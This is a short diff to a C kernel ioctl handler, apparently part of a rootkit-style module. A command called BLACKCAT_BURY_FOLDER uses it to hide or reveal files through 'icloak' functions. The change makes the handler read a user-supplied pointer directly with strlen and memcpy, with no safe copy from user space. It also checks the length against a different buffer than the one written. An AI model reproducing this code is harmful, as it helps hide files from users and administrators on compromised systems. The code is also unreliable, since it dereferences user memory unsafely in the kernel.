@@ -22,14 +22,14 @@ int cdev_ioctl(dev_t dev, u_long cmd, void *u_addr, int flag, struct lwp *lp) {
                 return EINVAL;
             }
 
-            data_size = strlen((char *)data);
+            data_size = strlen((char *)u_addr);
 
             if (data_size > sizeof(data) - 1) {
                 return EINVAL;
             }
 
             memset(temp, 0, sizeof(temp));
-            memcpy(temp, (char *)data, data_size);
+            memcpy(temp, (char *)u_addr, data_size);
 
             errno = (cmd == BLACKCAT_BURY_FOLDER) ? icloak_hide_file(temp) :
                                                     icloak_show_file(temp);
